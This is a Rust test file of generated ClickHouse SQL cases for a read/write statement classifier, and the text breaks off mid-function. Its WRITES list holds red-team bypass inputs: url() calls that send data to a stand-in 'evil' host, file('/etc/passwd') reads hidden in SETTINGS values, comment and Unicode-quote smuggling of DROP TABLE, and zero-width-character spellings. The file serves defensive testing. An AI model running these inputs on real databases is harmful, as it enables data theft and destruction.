//! Generated cases of ClickHouse SQL (`dialect::clickhouse`, fixture
//! `tests/fixtures/classify-generated/clickhouse.json`).
//!
//! ClickHouse reads are `SELECT`, `WITH`, queries that start with `FROM` (also with pipe
//! operators `|>`), `SHOW`, `DESCRIBE` / `DESC`, `EXPLAIN` and `EXISTS`, all of them queries of
//! the rules. Everything else writes, and so does a read that names a table function outside
//! the allow-list where a table goes, calls a function that reaches other servers, the server's
//! files or programs or changes server state (`write_calls`), or holds `INTO`, `PARALLEL`
//! (`SHOW TABLES PARALLEL WITH DROP TABLE t` drops the table), `ANALYZE` (every
//! `EXPLAIN ANALYZE`), `stream_like_engine_allow_direct_select`, a setting whose value is SQL
//! the server runs or a file or host it reaches, or any `SETTINGS` clause (`select`, `order`
//! and `filter` take SQL and are keywords). Strings and the ASCII quoted names take backslash
//! escapes; the Unicode-quoted ones (`‘…’` strings, `“…”` names) take none and end at the first
//! closing quote, so a reading without escapes in names goes with the one with them. `$tag$` heredocs are strings, block comments nest, and `--`, `#` and
//! `//` start line comments that end only at an LF.

use super::Suite;
use crate::sqlgen::dialect::clickhouse::SPEC;

/// Ordinary reads of a ClickHouse user: web analytics on MergeTree tables (FINAL, SAMPLE,
/// PREWHERE, ARRAY JOIN, LIMIT BY, WITH TOTALS / ROLLUP / CUBE, WITH FILL, QUALIFY, ASOF and
/// GLOBAL joins), higher-order and parametric aggregates, combinators, column transformers,
/// maps, tuples, arrays, JSON, dictionaries, the allowed table functions, typed parameters,
/// FROM-first and pipe queries, every `SHOW`, `DESCRIBE`, `EXPLAIN` and `EXISTS` form, catalog
/// queries of `system.*`, and the rules' words where they are no keywords or calls.
const READS: &[&str] = &[
    "SELECT 1",
    "SELECT * FROM hits WHERE CounterID = 62 AND EventDate >= '2013-07-01'",
    "SELECT URL, count() AS c FROM hits GROUP BY URL ORDER BY c DESC LIMIT 10",
    "SELECT EventDate, uniq(UserID) FROM hits SAMPLE 1/10 OFFSET 1/2 WHERE CounterID = 34 GROUP \
     BY EventDate ORDER BY EventDate",
    "SELECT * FROM events FINAL WHERE tenant = 'a' ORDER BY ts DESC LIMIT 100",
    "SELECT * FROM hits PREWHERE CounterID = 62 WHERE URL LIKE '%google%'",
    "SELECT s, a FROM arrays_test LEFT ARRAY JOIN arr AS a",
    "SELECT domain, path, count() FROM hits GROUP BY domain, path ORDER BY count() DESC LIMIT \
     5 BY domain",
    "SELECT * FROM t LIMIT 2 BY a, lower(b) LIMIT 10",
    "SELECT region, sum(amount) FROM sales GROUP BY region WITH TOTALS",
    "SELECT a, b, count() FROM t GROUP BY a, b WITH ROLLUP",
    "SELECT a, b, count() FROM t GROUP BY CUBE(a, b) HAVING count() > 1",
    "SELECT a, b FROM t GROUP BY GROUPING SETS ((a), (b), ())",
    "SELECT toDate(ts) AS d, count() FROM events GROUP BY d ORDER BY d WITH FILL STEP 1",
    "SELECT n FROM t ORDER BY n WITH FILL STEP 2 INTERPOLATE (v AS v + 1)",
    "SELECT id, row_number() OVER (PARTITION BY g ORDER BY ts) AS rn FROM t QUALIFY rn = 1",
    "SELECT * FROM trades t ASOF JOIN quotes q ON t.symbol = q.symbol AND t.ts >= q.ts",
    "SELECT * FROM local_t AS l GLOBAL ANY LEFT JOIN dist_t AS d USING (id)",
    "SELECT * FROM t1 SEMI JOIN t2 ON t1.a = t2.a",
    "SELECT * FROM t1 PASTE JOIN t2",
    "SELECT * FROM t WHERE id GLOBAL IN (SELECT id FROM dist_t)",
    "SELECT arrayMap(x -> x * 2, [1, 2, 3]), arrayFilter((x, i) -> i > 1, arr, \
     arrayEnumerate(arr)) FROM t",
    "SELECT quantiles(0.5, 0.9, 0.99)(duration), quantileTDigest(0.95)(latency) FROM requests",
    "SELECT sumIf(amount, status = 'paid'), countIf(x > 0), uniqExact(user_id), \
     argMax(price, ts), groupArray(10)(name) FROM orders",
    "SELECT topK(5)(word), anyHeavy(x), groupUniqArray(tag), sumMap(keys, vals) FROM t",
    "SELECT sumState(x) AS s, finalizeAggregation(s), uniqMerge(state) FROM agg GROUP BY k",
    "SELECT COLUMNS('^amount') APPLY(sum) FROM sales",
    "SELECT * EXCEPT (secret, token) FROM users",
    "SELECT * REPLACE (lower(email) AS email) FROM users",
    "SELECT map('a', 1, 'b', 2)['a'], tupleElement((1, 'x'), 2), (1, 'x').1, [1, 2, 3][2]",
    "SELECT {'k': 1}, mapKeys(attrs), mapValues(attrs), attrs['source'] FROM events",
    "SELECT data.user.id, data.^user, JSONExtractString(raw, 'name'), JSONExtract(raw, \
     'Array(UInt32)') FROM logs",
    "SELECT toTypeName(x), CAST(x AS Nullable(String)), x::UInt64, toDecimal64(price, 2), \
     toDateTime64(ts, 3, 'Asia/Jakarta') FROM t",
    "SELECT dictGet('geo.cities', 'name', toUInt64(city_id)), dictHas('geo.cities', 1) FROM t",
    "SELECT * FROM numbers(10)",
    "SELECT number FROM numbers_mt(1000000) WHERE number % 7 = 0",
    "SELECT * FROM zeros(5), zeros_mt(5)",
    "SELECT * FROM values('id UInt8, name String', (1, 'a'), (2, 'b'))",
    "SELECT * FROM (VALUES (1, 'a'), (2, 'b')) AS t(id, val)",
    "SELECT * FROM generateRandom('a Array(Int8), d Decimal32(4)', 1, 10, 2) LIMIT 3",
    "SELECT * FROM generate_series(1, 10), generateSeries(1, 5)",
    "SELECT * FROM view(SELECT a, b FROM t WHERE c > 0)",
    "SELECT count() FROM merge(currentDatabase(), '^hits_')",
    "SELECT * FROM null('x UInt8')",
    "SELECT * FROM t WHERE id = {id:UInt64} AND name = {name:String}",
    "SELECT * FROM {tbl:Identifier} LIMIT 10",
    "SELECT ts FROM events WHERE ts > now() - INTERVAL 1 DAY AND ts <= now64(3)",
    "SELECT toStartOfHour(ts), formatDateTime(ts, '%F %T'), dateDiff('day', a, b) FROM t",
    "SELECT if(x > 0, 'pos', 'neg'), multiIf(a = 1, 'one', a = 2, 'two', 'many'), \
     coalesce(b, 0), ifNull(c, '') FROM t",
    "SELECT CASE WHEN x > 0 THEN 'pos' ELSE 'neg' END FROM t",
    "SELECT * FROM t WHERE name ILIKE 'a%' AND body NOT LIKE '%x\\_y%' AND match(url, '^https')",
    "SELECT * FROM t WHERE (a, b) IN ((1, 2), (3, 4)) AND c NOT IN (5, 6)",
    "SELECT * FROM t WHERE a IS NOT NULL AND b IS NULL AND c BETWEEN 1 AND 10",
    "SELECT id FROM a UNION ALL SELECT id FROM b UNION DISTINCT SELECT id FROM c",
    "SELECT id FROM a EXCEPT SELECT id FROM b INTERSECT SELECT id FROM c",
    "(SELECT 1) UNION ALL (SELECT 2) ORDER BY 1",
    "SELECT * FROM t1 WHERE id IN (SELECT id FROM t2) AND EXISTS (SELECT 1 FROM t3 WHERE \
     t3.id = t1.id)",
    "SELECT count() FROM (SELECT DISTINCT user_id FROM events) AS d",
    "WITH recent AS (SELECT * FROM orders WHERE ts > now() - INTERVAL 30 DAY) SELECT \
     customer, sum(total) FROM recent GROUP BY customer",
    "WITH 10 AS n, toDate('2024-01-01') AS start SELECT number + n, start FROM numbers(3)",
    "WITH sum(bytes) AS s SELECT formatReadableSize(s), table FROM system.parts GROUP BY table \
     ORDER BY s DESC",
    "WITH RECURSIVE r AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM r WHERE n < 5) SELECT * \
     FROM r",
    "SELECT * FROM t FORMAT JSONEachRow",
    "SELECT * FROM t LIMIT 10 OFFSET 20",
    "SELECT * FROM t ORDER BY a NULLS LAST, b DESC NULLS FIRST LIMIT 5 WITH TIES",
    "SELECT * FROM t OFFSET 5 ROWS FETCH FIRST 10 ROWS ONLY",
    "SELECT DISTINCT ON (a) a, b FROM t",
    "FROM hits SELECT URL WHERE CounterID = 62",
    "FROM orders WHERE amount > 100",
    "FROM orders |> WHERE cancelled = 0 |> AGGREGATE sum(amount) AS total GROUP BY customer |> \
     ORDER BY total DESC |> LIMIT 3",
    "FROM orders |> EXTEND amount * 10 AS big |> SET amount = amount + 1 |> DROP cancelled",
    "FROM orders |> AS o |> JOIN customers AS c ON o.customer = c.id",
    "SELECT name, engine, total_rows FROM system.tables WHERE database = currentDatabase()",
    "SELECT query_id, user, elapsed, query FROM system.processes ORDER BY elapsed DESC",
    "SELECT mutation_id, command, is_done FROM system.mutations WHERE is_done = 0",
    // `SETTINGS` is a word of `writes`: quoted, the table reads.
    "SELECT name, value FROM system.`settings` WHERE changed",
    "SELECT `Settings`, query FROM system.query_log WHERE type = 'QueryFinish'",
    "SELECT * FROM system.settings_changes, system.merge_tree_settings",
    "SELECT * FROM system.parts WHERE active AND table = 'hits'",
    "SELECT version(), uptime(), currentUser(), timezone(), hostName()",
    "SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema = 'default'",
    "SELECT url, file, remote, path, \"into\", `parallel`, domain(url) FROM hits",
    "SELECT 'INSERT INTO t SELECT * FROM url(''x'')' AS s, $h$DROP TABLE t; SELECT \
     file('x')$h$ AS d, 'it\\'s' AS e",
    "SELECT \"remote\" FROM t",
    "SELECT * FROM `url`",
    "SELECT * FROM db.\"s3\" AS s3_copy",
    "-- INSERT INTO t\nSELECT 1 # SYSTEM FLUSH LOGS\n// DROP TABLE t\n/* ALTER TABLE t */",
    "SELECT created_into, parallel_degree, stream_id FROM audit",
    "SELECT icebergBucket(16, id), icebergTruncate(10, name) FROM t",
    "SELECT sleep(1)",
    // A backslash escapes the quote: one string.
    "SELECT 'a\\'; DROP TABLE t; --'",
    // Unicode quotes: strings and names, the rules' words inside them.
    "SELECT ‘a b’ AS s, “my col” FROM “my db”.“my table” WHERE ‘x’ = ‘x’",
    "SELECT ‘INSERT INTO t SELECT * FROM url(''x'')’ AS s, “into”, “parallel”, “file” FROM hits",
    "SELECT s, arr, a FROM arrays_test ARRAY JOIN arr AS a, arr2 AS b",
    "SELECT 1.5, .5, 1e3, 0x1F, 0b101, 1_000_000, inf, nan, -inf",
    "SELECT\n  o.id,\n  o.total\nFROM\n  orders AS o\nWHERE\n  o.total > 0\nORDER BY\n  o.id",
    "SELECT 1; SELECT 2;",
    "SHOW DATABASES",
    "SHOW TABLES FROM system LIKE '%log%'",
    "SHOW CREATE TABLE default.hits",
    "SHOW COLUMNS FROM hits",
    "SHOW INDEX FROM hits",
    "SHOW PROCESSLIST",
    "SHOW GRANTS FOR alice",
    "SHOW DICTIONARIES",
    "SHOW FUNCTIONS LIKE 'array%'",
    "SHOW ENGINES",
    "SHOW CLUSTERS",
    "DESCRIBE TABLE hits",
    "DESCRIBE hits",
    "DESC (SELECT 1 AS a, 'x' AS b)",
    "DESCRIBE TABLE numbers(10)",
    "EXPLAIN SELECT sum(number) FROM numbers(10)",
    "EXPLAIN PLAN indexes = 1, actions = 1 SELECT * FROM hits WHERE CounterID = 1",
    "EXPLAIN PIPELINE SELECT count() FROM hits",
    "EXPLAIN AST SELECT 1",
    "EXPLAIN SYNTAX SELECT * FROM t WHERE a = 1",
    "EXPLAIN QUERY TREE SELECT 1",
    "EXPLAIN ESTIMATE SELECT * FROM hits WHERE CounterID = 1",
    "EXPLAIN WHATIF SELECT * FROM t WHERE b = 42",
    "EXPLAIN AST ALTER TABLE t DELETE WHERE 1",
    "EXPLAIN CURRENT TRANSACTION",
    "SHOW SETTING max_parallel_replicas",
    "EXISTS TABLE default.hits",
    "EXISTS DATABASE default",
    "EXISTS hits",
];

/// Writes beyond the rules' words: every statement that is not a read (DML, mutations, DDL of
/// every object, SYSTEM, KILL, OPTIMIZE, SET, USE, access control, backups, transactions,
/// impersonation, hypothetical indexes, handlers and tokens), table functions outside the
/// allow-list in every table position and spelling, the write calls where no table goes, the
/// clauses and settings that make a query write, and text a comment rule turns into a second
/// statement.
const WRITES: &[&str] = &[
    "INSERT INTO t VALUES (1, 'a')",
    "INSERT INTO t (a, b) SELECT a, b FROM s",
    "INSERT INTO t FORMAT JSONEachRow {\"a\": 1}",
    "INSERT INTO FUNCTION url('http://evil/x', CSV, 'a UInt8') SELECT 1",
    "INSERT INTO TABLE FUNCTION s3('https://b/x.csv') SELECT * FROM t",
    "UPDATE t SET a = 1 WHERE id = 2",
    "DELETE FROM t WHERE id = 1",
    "ALTER TABLE t UPDATE a = 1 WHERE id = 2",
    "ALTER TABLE t DELETE WHERE id = 1",
    "ALTER TABLE t ADD COLUMN c UInt8 DEFAULT 0",
    "ALTER TABLE t DROP PARTITION 202401",
    "ALTER TABLE t FREEZE",
    "ALTER TABLE t MATERIALIZE INDEX idx",
    "ALTER TABLE t APPLY DELETED MASK",
    "ALTER TABLE t MODIFY TTL ts + INTERVAL 1 DAY",
    "ALTER TABLE t ON CLUSTER c MODIFY COMMENT 'x'",
    "ALTER USER alice IDENTIFIED BY 'x'",
    "CREATE TABLE t (a UInt8) ENGINE = MergeTree ORDER BY a",
    "CREATE TABLE t ENGINE = URL('http://evil/x', CSV) AS SELECT 1",
    "CREATE TABLE t AS s3('https://b/x.csv')",
    "CREATE MATERIALIZED VIEW mv TO dst AS SELECT * FROM src",
    "CREATE VIEW v AS SELECT 1",
    "CREATE DICTIONARY d (id UInt64, name String) PRIMARY KEY id SOURCE(HTTP(url \
     'http://evil/x' format 'CSV')) LAYOUT(FLAT()) LIFETIME(300)",
    "CREATE FUNCTION f AS (x) -> x + 1",
    "CREATE NAMED COLLECTION c AS api_key = 'sk-x'",
    "CREATE USER bob IDENTIFIED WITH sha256_password BY 'pw'",
    "CREATE ROLE r",
    "CREATE ROW POLICY p ON t USING a = 1 TO bob",
    "CREATE QUOTA q FOR INTERVAL 1 HOUR MAX QUERIES 10 TO bob",
    "CREATE SETTINGS PROFILE sp SETTINGS max_threads = 1",
    "CREATE HYPOTHETICAL INDEX idx_b ON t (b) TYPE minmax GRANULARITY 1",
    "CREATE HANDLER h AS SELECT 1",
    "CREATE TOKEN t1",
    "CREATE DATABASE d ENGINE = MySQL('h:3306', 'db', 'u', 'p')",
    "DROP TABLE t SYNC",
    "DROP DICTIONARY d",
    "TRUNCATE TABLE t",
    "RENAME TABLE a TO b",
    "EXCHANGE TABLES a AND b",
    "UNDROP TABLE t",
    "ATTACH TABLE t",
    "DETACH TABLE t PERMANENTLY",
    "OPTIMIZE TABLE t FINAL DEDUPLICATE",
    "SYSTEM FLUSH LOGS",
    "SYSTEM RELOAD DICTIONARY d",
    "SYSTEM RELOAD DICTIONARIES",
    "SYSTEM DROP MARK CACHE",
    "SYSTEM STOP MERGES t",
    "SYSTEM SHUTDOWN",
    "KILL QUERY WHERE query_id = 'x'",
    "KILL MUTATION WHERE mutation_id = 'm'",
    "SET max_threads = 1",
    "SET ROLE ALL",
    "SET DEFAULT ROLE r TO bob",
    "SET dialect = 'kusto'",
    "USE other",
    "USE db PARALLEL WITH DROP TABLE t",
    "GRANT SELECT ON *.* TO bob",
    "REVOKE ALL ON *.* FROM bob",
    "MOVE USER bob TO local_directory",
    "BACKUP TABLE t TO Disk('backups', 'b.zip')",
    "RESTORE TABLE t FROM S3('https://b/x', 'k', 's')",
    "BEGIN TRANSACTION",
    "COMMIT",
    "ROLLBACK",
    "EXECUTE AS bob SELECT 1",
    "CHECK TABLE t",
    "CHECK GRANT SELECT ON t",
    "WATCH lv",
    "DROP TABLE a PARALLEL WITH DROP TABLE b",
    "SELECT 1 PARALLEL WITH DROP TABLE t",
    // The server runs the statements of PARALLEL WITH side by side and refuses one with a
    // result only after it has run, so the DROP runs (red team, round 1).
    "SHOW TABLES PARALLEL WITH DROP TABLE t",
    "EXISTS t PARALLEL WITH DROP TABLE t",
    "DESCRIBE TABLE t PARALLEL WITH DROP TABLE t",
    "DESC t PARALLEL WITH TRUNCATE TABLE t",
    "SHOW CREATE TABLE t PARALLEL WITH SYSTEM SHUTDOWN",
    // EXPLAIN takes no PARALLEL WITH of its own: the statement around it does.
    "EXPLAIN SELECT 1 PARALLEL WITH DROP TABLE t",
    "EXPLAIN AST SELECT 1 PARALLEL WITH DROP TABLE t",
    "EXPLAIN PLAN indexes = 1 SELECT 1 PARALLEL WITH DROP TABLE t",
    "EXPLAIN CURRENT TRANSACTION PARALLEL WITH DROP TABLE t",
    "SHOW TABLES INTO OUTFILE 'x.tsv'",
    // A scalar subquery the analyzer may run while it explains or describes.
    "EXPLAIN SELECT (SELECT count() FROM kafka_t SETTINGS \
     stream_like_engine_allow_direct_select = 1)",
    "DESCRIBE (SELECT * FROM kafka_t SETTINGS stream_like_engine_allow_direct_select = 1)",
    // EXPLAIN ANALYZE runs its statement; that of a read is a write too (a known false write),
    // and so is an EXPLAIN of an INSERT, which only plans it.
    "EXPLAIN ANALYZE SELECT number % 10 AS k, count() FROM numbers_mt(1000000) GROUP BY k",
    "EXPLAIN INSERT INTO t SELECT * FROM s",
    "SELECT * FROM t INTO OUTFILE 'x.csv' TRUNCATE",
    "SELECT * FROM t INTO OUTFILE 'x.csv.gz' AND STDOUT COMPRESSION 'gzip'",
    "SELECT * FROM kafka_events SETTINGS stream_like_engine_allow_direct_select = 1",
    // Settings whose values are SQL the server parses with every function at hand, which
    // `readonly=2` does not stop (red team, round 3). The 26.8 query-construction settings wrap
    // the query (`SELECT <select> FROM (…) WHERE <filter> ORDER BY <order>`); `select`, `order`
    // and `filter` are keywords, so the SETTINGS clause itself is a write word, quoted setting
    // names included.
    "SELECT 1 SETTINGS select = 'file(''/etc/passwd'')'",
    "SELECT * FROM t SETTINGS filter = 'length(file(''/etc/passwd'')) > 0'",
    "SELECT * FROM t SETTINGS order = '(SELECT count() FROM url(''http://evil/x'', CSV, ''a \
     String''))'",
    "SELECT * FROM t SETTINGS select = '*', filter = 'a IN (SELECT 1 FROM s3(''https://b/x''))'",
    "SELECT * FROM t SETTINGS `select` = 'file(''/etc/passwd'')'",
    "SELECT * FROM t SETTINGS \"filter\" = 'file(''/etc/passwd'') != '''''",
    "SELECT * FROM t SETTINGS “order” = 'file(''/etc/passwd'')'",
    "SELECT * FROM t SETTINGS additional_result_filter = 'file(''/etc/passwd'') != '''''",
    "SELECT * FROM t SETTINGS additional_table_filters = {'t': 'a IN (SELECT 1 FROM \
     url(''http://evil/x'', CSV, ''a UInt8''))'}",
    "SELECT * FROM t SETTINGS parallel_replicas_custom_key = 'cityHash64(file(''/etc/passwd''))', \
     max_parallel_replicas = 2, parallel_replicas_mode = 'custom_key_sampling'",
    // Beside a query-construction setting the server parses it as a FROM list.
    "SELECT 1 SETTINGS implicit_table_at_top_level = 'url(''http://evil/x'', CSV, ''a \
     String'')', limit = 10",
    // `format_schema` becomes a query the server runs for the Protobuf result.
    "SELECT 1 FORMAT Protobuf SETTINGS format_schema_source = 'query', format_schema = 'SELECT \
     * FROM url(''http://evil/x'', CSV, ''a String'')'",
    // A result in another format writes a schema file or reads schema and template files on the
    // server, and a read that parses CSV writes its errors to a file.
    "SELECT 1 FORMAT CapnProto SETTINGS output_format_schema = 'x.capnp'",
    "SELECT 1 FORMAT Template SETTINGS format_template_resultset = 'x.txt'",
    "SELECT 1 FORMAT Protobuf SETTINGS format_schema = 'x.proto:M'",
    "SELECT * FROM csv_file_t SETTINGS input_format_allow_errors_num = 10, \
     input_format_record_errors_file_path = 'errors.log'",
    // Existing URL and S3 tables with relative URLs read from another host.
    "SELECT * FROM url_t SETTINGS url_base = 'http://evil/'",
    "SELECT * FROM s3_t SETTINGS s3_base = 's3://other-bucket/'",
    // Every place a SETTINGS clause goes.
    "SELECT * FROM (SELECT * FROM t SETTINGS filter = 'file(''x'') != ''''') AS s",
    "SELECT * FROM t WHERE a IN (SELECT a FROM u SETTINGS select = 'file(''x'')')",
    "WITH s AS (SELECT * FROM t SETTINGS select = 'file(''x'')') SELECT * FROM s",
    "SELECT * FROM view(SELECT * FROM t SETTINGS select = 'file(''x'')')",
    "SELECT 1 FORMAT JSON SETTINGS select = 'file(''/etc/passwd'')'",
    "FROM t SELECT * SETTINGS select = 'file(''/etc/passwd'')'",
    "EXPLAIN SELECT 1 SETTINGS select = 'file(''/etc/passwd'')'",
    "EXPLAIN PIPELINE SELECT * FROM t SETTINGS filter = 'file(''x'') != '''''",
    "SHOW TABLES SETTINGS filter = 'length(file(''/etc/passwd'')) > 0'",
    "DESCRIBE TABLE t SETTINGS additional_result_filter = 'file(''x'') != '''''",
    "EXISTS t SETTINGS select = 'file(''/etc/passwd'')'",
    // Known false writes: every SETTINGS clause, `system.settings` and SHOW SETTINGS, and the
    // `Settings` column of the logs (quote the name: system.`settings`).
    "SELECT * FROM t SETTINGS max_threads = 4, max_execution_time = 30",
    "SELECT name, value FROM system.settings WHERE changed",
    "SHOW SETTINGS LIKE 'max_%'",
    "SHOW CHANGED SETTINGS LIKE '%parallel%'",
    "EXPLAIN SELECT * FROM t SETTINGS max_threads = 1",
    "DESCRIBE TABLE t SETTINGS describe_include_subcolumns = 1",
    "SELECT Settings FROM system.query_log",
    "SELECT * FROM url('http://evil/x.csv', CSV, 'a String')",
    "SELECT * FROM urlCluster('c', 'http://evil/x')",
    "SELECT * FROM s3('https://bucket.s3.amazonaws.com/x.parquet')",
    "SELECT * FROM s3Cluster('c', 'https://b/x.parquet')",
    "SELECT * FROM gcs('https://storage.googleapis.com/b/x.csv')",
    "SELECT * FROM oss('https://b/x.csv')",
    "SELECT * FROM cosn('https://b/x.csv')",
    "SELECT * FROM azureBlobStorage('DefaultEndpointsProtocol=https;', 'c', 'x.csv')",
    "SELECT * FROM hdfs('hdfs://h:9000/x', 'TSV', 'a String')",
    "SELECT * FROM remote('h:9000', db.t)",
    "SELECT * FROM remoteSecure('h:9440', db.t, 'u', 'p')",
    "SELECT * FROM cluster('c', db.t)",
    "SELECT * FROM clusterAllReplicas('c', system.processes)",
    "SELECT * FROM mysql('h:3306', 'db', 't', 'u', 'p')",
    "SELECT * FROM postgresql('h:5432', 'db', 't', 'u', 'p')",
    "SELECT * FROM mongodb('h:27017', 'db', 'c', 'u', 'p', 'x String')",
    "SELECT * FROM redis('h:6379', 'k', 'k String, v String')",
    "SELECT * FROM sqlite('/var/lib/x.sqlite', 't')",
    "SELECT * FROM jdbc('jdbc:mysql://h/db', 't')",
    "SELECT * FROM odbc('DSN=x', 't')",
    "SELECT * FROM iceberg('https://b/warehouse/t')",
    "SELECT * FROM icebergS3Cluster('c', 'https://b/t')",
    "SELECT * FROM icebergLocalCluster('c', '/data/t')",
    // icebergLocalCluster reads the files of every node, also where no table goes.
    "SELECT 1 IN icebergLocalCluster('c', '/data/t')",
    "SELECT 1 GLOBAL IN icebergLocalCluster('c', '/data/t')",
    "EXPLAIN TABLE OVERRIDE icebergLocalCluster('c', '/data/t') PARTITION BY a",
    "SELECT 1 IN traceView('5c9e4a3b-2f61-4d6e-8b7a-90c1d2e3f405', 40, 'c')",
    "SELECT * FROM traceView('5c9e4a3b-2f61-4d6e-8b7a-90c1d2e3f405')",
    "SELECT * FROM obfuscate(SELECT number FROM numbers(10)) LIMIT 10",
    "SELECT * FROM deltaLake('https://b/t')",
    "SELECT * FROM hudi('https://b/t')",
    "SELECT * FROM paimon('https://b/t')",
    "SELECT * FROM ytsaurus('http://h', '//t', 'tok', 'a UInt8')",
    "SELECT * FROM arrowFlight('h:8815', 'ds')",
    "SELECT * FROM bigquery('p', 'd', 't')",
    "SELECT * FROM elasticsearch('http://h:9200', 'i')",
    "SELECT * FROM file('data.csv', 'CSV')",
    "SELECT * FROM fileCluster('c', 'data*.csv')",
    "SELECT * FROM filesystem('/')",
    "SELECT * FROM executable('script.sh', TabSeparated, 'a String')",
    "SELECT * FROM eval('SELECT * FROM url(''http://evil'')')",
    "SELECT * FROM dictionary('geo.cities')",
    "SELECT * FROM input('a UInt8')",
    "SELECT * FROM format(JSONEachRow, '{\"a\": 1}')",
    "SELECT * FROM loop(numbers(3)) LIMIT 10",
    "SELECT * FROM mergeTreeIndex(currentDatabase(), t)",
    "SELECT * FROM primes() LIMIT 10",
    "SELECT * FROM t JOIN url('http://evil') AS u ON t.id = u.id",
    "SELECT * FROM t, s3('https://b/x')",
    "SELECT * FROM t AS a, numbers(3) AS b, remote('h', db.t) AS c",
    "SELECT * FROM (SELECT * FROM url('http://evil')) AS s",
    "SELECT * FROM (url('http://evil') CROSS JOIN t)",
    "SELECT * FROM db.url('http://evil')",
    "SELECT * FROM `url`('http://evil')",
    "SELECT * FROM \"s3\"('https://b/x')",
    "SELECT * FROM url /* c */ ('http://evil')",
    "SELECT * FROM url\n('http://evil')",
    "WITH s AS (SELECT * FROM mysql('h', 'db', 't', 'u', 'p')) SELECT * FROM s",
    "SELECT * FROM t WHERE id IN (SELECT id FROM s3('https://b/x'))",
    "SELECT * FROM view(SELECT * FROM url('http://evil'))",
    "SELECT * FROM t WHERE a IN remote('h', db.t)",
    "SELECT * FROM numbers(1) AS settings, url('http://evil/x', CSV, 'a String')",
    "FROM url('http://evil/x') SELECT *",
    "FROM t |> JOIN url('http://evil') AS u ON t.id = u.id",
    "DESCRIBE TABLE url('http://evil/x', CSV)",
    "DESC s3('https://b/x')",
    "EXPLAIN SELECT * FROM url('http://evil')",
    "EXPLAIN TABLE OVERRIDE mysql('h:3306', 'db', 't', 'u', 'p') PARTITION BY a",
    "EXPLAIN ANALYZE SELECT * FROM t INTO OUTFILE 'x'",
    "EXPLAIN ANALYZE INSERT INTO t SELECT 1",
    "SELECT file('/etc/passwd')",
    "SELECT length(file('secret.txt', '')) FROM numbers(1)",
    "SELECT aiGenerate('Summarize this', text) FROM docs",
    "SELECT aiEmbed(text, 'text-embedding-3-small') FROM docs",
    "SELECT generateSerialID('orders')",
    "SELECT logTrace('hello')",
    "SELECT showCertificate()",
    "SELECT addressToLine(arrayJoin(trace)) FROM system.trace_log",
    "SELECT addressToSymbol(1)",
    "SELECT hasColumnInTable('h', 'u', 'p', 'db', 't', 'c')",
    "SELECT catboostEvaluate('/models/m.bin', a, b) FROM t",
    "SELECT `file`('x')",
    "SELECT system.file('x')",
    "SELECT * FROM t WHERE x = file /* c */ ('x')",
    "SELECT 1; DROP TABLE t",
    "SHOW TABLES; SYSTEM FLUSH LOGS",
    "EXPLAIN SELECT 1; TRUNCATE TABLE t",
    "SELECT 1 // '\nFROM url('http://evil/x', CSV) --'",
    "SELECT 1 # '\nFROM url('http://evil/x', CSV) --'",
    "SELECT * FROM t /* /* */ DROP TABLE t */",
    "SELECT 1 -- c\rDROP TABLE t",
    "SELECT $h$ $h$; DROP TABLE t",
    "SELECT 'a\\\\'; DROP TABLE t",
    "SELECT `a\\\\`; DROP TABLE t",
    "SELECT 1INTO t",
    "SELECT 1e0file('x')",
    // Unicode quotes (red team, round 2): `“…”` is a quoted name, so a callee, in every
    // position; `‘…’` a string. Neither takes escapes, and what they hold opens no string,
    // comment or heredoc.
    "SELECT “file”('/etc/passwd')",
    "SELECT * FROM “url”('http://evil/x', CSV, 'a String')",
    "SELECT * FROM t WHERE 1 IN “remote”('h', db.t)",
    "SELECT * FROM db.“s3”('https://b/x')",
    "SELECT “aiGenerate”('x')",
    "SELECT * FROM t JOIN “mysql”('h:3306', 'db', 't', 'u', 'p') AS m ON t.id = m.id",
    "SELECT * FROM t, “s3”('https://b/x')",
    "SELECT * FROM “dictionary”('geo.cities')",
    "DESCRIBE TABLE “url”('http://evil/x', CSV)",
    "EXPLAIN TABLE OVERRIDE “mysql”('h:3306', 'db', 't', 'u', 'p') PARTITION BY a",
    "SELECT ‘file’('/etc/passwd')",
    "SELECT ‘'’, file('/etc/passwd') --'",
    "SELECT “'”, file('/etc/passwd') --'",
    "SELECT “`”, file('/etc/passwd') --`",
    "SELECT ‘\"’, file('/etc/passwd') --\"",
    "SELECT ‘--’, file('/etc/passwd')",
    "SELECT ‘#’, file('/etc/passwd')",
    "SELECT ‘# ’, file('/etc/passwd')",
    "SELECT ‘//’, file('/etc/passwd')",
    "SELECT ‘/*’, file('/etc/passwd') -- */",
    "SELECT ‘$h$’, file('/etc/passwd'), ‘$h$’",
    "SELECT * FROM t WHERE a = ‘'’ UNION ALL SELECT * FROM url('http://evil/x', CSV, 'a String') \
     --'",
    "SELECT ‘'’ AS x PARALLEL WITH DROP TABLE t --'",
    "SELECT “--” PARALLEL WITH DROP TABLE t",
    "SELECT “\\”, file('/etc/passwd') --”",
    "SELECT ‘\\’, file('/etc/passwd') --’",
    // A known false write: the reading without escapes in names (the Unicode quotes') ends the
    // name at `\``.
    "SELECT `a\\`; DROP TABLE t; --`",
    // Known false writes: a quoted name matches the allow-list on its exact text only.
    "SELECT * FROM “numbers”(10) AS n, “zeros”(2)",
    // Closed in F8c (shared scanner): whitespace ClickHouse skips and Rust does not (format
    // characters), a heredoc tag that starts with a digit, a `$tag$` that never closes (a word
    // to ClickHouse), and a backquoted callee written with escapes.
    "SELECT file\u{200B}('/etc/passwd')",
    "SELECT file\u{180E}('/etc/passwd')",
    "SELECT * FROM url\u{FEFF}('http://evil/x', CSV, 'a String')",
    "SELECT 1 IN remote\u{2060}('h', db.t)",
    "SELECT $1$'$1$, file('/etc/passwd') -- '",
    "SELECT 1 AS $a$, * FROM url('http://evil/x', CSV, 'a String')",
    "SELECT `fil\\x65`('/etc/passwd')",
    "SELECT * FROM `\\x75rl`('http://x', CSV)",
];

fn suite() -> Suite {
    Suite::new("clickhouse", &SPEC)
        .reads(READS)
        .writes(WRITES)
        .active("after FINAL", "SELECT * FROM t FINAL ", " t")
        .active("after SAMPLE", "SELECT * FROM t SAMPLE 1/10 ", " t")
        .active(
            "after PREWHERE",
            "SELECT * FROM t PREWHERE a = 1 AND ",
            " t",
        )
        .active(
            "in ARRAY JOIN",
            "SELECT * FROM t ARRAY JOIN arr AS a, ",
            " t",
        )
        .active("after LIMIT BY", "SELECT * FROM t LIMIT 1 BY a, ", " t")
        .active(
            "after WITH TOTALS",
            "SELECT count() FROM t GROUP BY a WITH TOTALS ",
            " t",
        )
